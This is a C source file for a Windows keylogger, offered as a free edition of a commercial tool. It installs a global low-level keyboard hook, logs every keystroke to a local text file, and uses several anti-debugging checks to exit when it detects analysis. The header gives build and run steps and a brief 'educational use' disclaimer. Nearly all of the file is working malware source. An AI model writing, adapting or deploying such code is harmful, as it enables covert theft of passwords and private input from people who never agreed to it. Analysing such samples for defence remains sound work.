/*

Filename     : keylogger.c

Author       : Byte Reaper

Description  :

Free Version Keylogger: a lightweight, proof-of-concept Windows keylogger

implemented in C using WinAPI. Captures keystrokes at low level and writes

them to a UTF-8 text log, with built-in anti-debugging checks.


Features:

• Global low-level keyboard hook (WH_KEYBOARD_LL)

• Captures and logs all printable Unicode characters

• Named placeholders for special keys (ENTER, BACKSPACE, CTRL, ALT, etc.)

• Lookup of unmapped keys via GetKeyNameText

• UTF-8 encoding of captured characters (WideCharToMultiByte)

Anti-Debugging:

API check: CheckRemoteDebuggerPresent(GetCurrentProcess())

Native call: NtQueryInformationProcess(ProcessDebugPort)

Manual PEB flag inspection  (ASM) via BeingDebugged exit with ExitProcess

Standalone assembly PEB-based check module (anti_debug.asm)

Usage:

Compile:

 1 - nasm -f win64 pebDebug.asm -o peb.o 
 2 - gcc -c keylogger.c -o keylogger.o
 3 - gcc keylogger.o peb.o  -o fullkeylogger
 
Run:

 .\FreeKeylogger.exe

 → Creates/appends to “keylogger.txt” in working directory

View log:

 type keylogger.txt

Warning:

– Intended strictly for educational/research use on systems you own or are

explicitly authorized to test. Unauthorized use against third-party machines

may be illegal.

– This free version omits advanced features (screenshots, stealth, encryption).

See Standard/Pro/Elite editions for full functionality.

Dependencies:

– Windows 7 and later

– Immune to basic user-mode debugging (but not a substitute for full anti-analysis)

Notes:

– Log file is UTF-8 encoded; ensure your viewer supports it.

– Runs until manually closed; press Ctrl+C in console to stop.

– Hook runs in background thread—console must remain open to capture keystrokes.
*/


#include <windows.h>
#include <stdio.h>
#include <winternl.h> 
#include <winuser.h>
HHOOK  hook;
FILE* f;

LRESULT CALLBACK keyLogger(int inCode,
    WPARAM wparam,
    LPARAM lparam)
{
    if (inCode == HC_ACTION)
    {

        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lparam;
        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
        {
            DWORD vkCode = p->vkCode;
            char key[50];
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
            WCHAR uniCodeChar;
            int result = ToUnicode(vkCode, scanCode, keyboardState, &uniCodeChar, 1, 0);
            if (result > 0) {

                int len = WideCharToMultiByte(CP_UTF8, 0, &uniCodeChar, 1, key, sizeof(key), NULL, NULL);
                key[len] = '\0'; 
                fprintf(f, "%s",key);
            }
            else
            {
                switch (vkCode)
                {
                case VK_BACK:
                    fprintf(f, "[BACKSPACE]");
                    break;
                case VK_RETURN:
                    fprintf(f, "[ENTER]\n");
                    break;
                case VK_TAB:
                    fprintf(f, "[TAB]");
                    break;
                case VK_SHIFT:
                    fprintf(f, " [SHIFT] ");
                    break;
                case VK_CONTROL:
                    fprintf(f, " [CTRL] ");
                    break;
                case VK_MENU:
                    fprintf(f, " [ALT]");
                    break;
                case VK_CAPITAL:
                    fprintf(f, "[CAPSLOCK]");
                    break;
                case VK_ESCAPE:
                    fprintf(f, "[ESC]");
                    break;
                case VK_SPACE:
                    fprintf(f, " ");
                    break;
                case VK_LEFT:
                    fprintf(f, "[LEFT]");
                    break;
                case VK_RIGHT:
                    fprintf(f, "[RIGHT]");
                    break;
                case VK_UP:
                    fprintf(f, "[UP]");
                    break;
                case VK_DOWN:
                    fprintf(f, "[DOWN]");
                    break;
                case VK_DELETE:
                    fprintf(f, "[DEL]");
                    break;
                default:

                    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
                    UINT lParam = (scanCode << 16);
                    if (vkCode & 0x80000000) lParam |= 0x01000000;
                    char keyName[256] = { 0 };
                    GetKeyNameText(lParam, keyName, sizeof(keyName));
                    if (strlen(keyName) > 0)
                    {
                        fprintf(f, "[%s]", keyName);
                    }
                    else
                    {
                        fprintf(f, "[%lu]", (unsigned long)vkCode);
                    }
                    break;
                
                }
                fflush(f);
            }
        }
        return CallNextHookEx(hook, inCode, wparam, lparam);
    }
}
BOOL checkDebug()
{
    BOOL pbDebuggerPresent = FALSE; 
    CheckRemoteDebuggerPresent(GetCurrentProcess(),&pbDebuggerPresent);
    return pbDebuggerPresent;
}

typedef NTSTATUS (WINAPI *processDebug)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
);
void ntprocess()
{
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll == NULL)
    {
        printf("[-] Error Load Library\n");
    }

    processDebug ntQinfo = (processDebug)GetProcAddress(ntdll,"NtQueryInformationProcess");
    if (!ntQinfo)
    {
        printf("[-] Error Get NtQueryInformationProcess\n");
    }
    DWORD debugPort = 0;
    NTSTATUS stat = ntQinfo(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x7,
        &debugPort,
        sizeof(DWORD),
        NULL 
        );
    if (stat == 0 && debugPort != 0)
    {
        printf("[-] Debug Detecte !!\n");
        exit(1);
    }
    else
    {
        printf("[+] Not Debug !!\n"); 

    }
}
int main() 
{
    f = fopen("keylogger.txt", "a");
    if (f == NULL) 
    {
        printf("[-] Error opening file!\n");
        return 1;
    }
    BOOL debuggerDetected = checkDebug();
    if (debuggerDetected)
    {
        exit(1);
    }
    ntprocess(); 
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyLogger, NULL, 0);
    if (hook == NULL)
    {
        printf("[-] Error installing hook\n");
        fclose(f);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) 
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(f);
    return 0;
} 